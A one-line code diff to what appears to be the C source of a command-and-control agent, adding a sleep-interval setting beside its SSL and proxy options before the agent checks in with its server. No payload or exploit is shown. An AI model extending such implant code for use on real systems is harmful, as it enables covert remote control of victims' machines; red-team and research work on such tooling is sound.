@@ -18,7 +18,7 @@ VOID ceosMain()
     ceosConfig->isSSL = ssl;
     ceosConfig->isProxyEnabled = proxyenabled;
     ceosConfig->proxyURL = (PWCHAR)proxyurl;
-
+    ceosConfig->sleeptime = sleep_time;
 
     PParser ResponseParser = checkin();
     parseCheckin(ResponseParser);
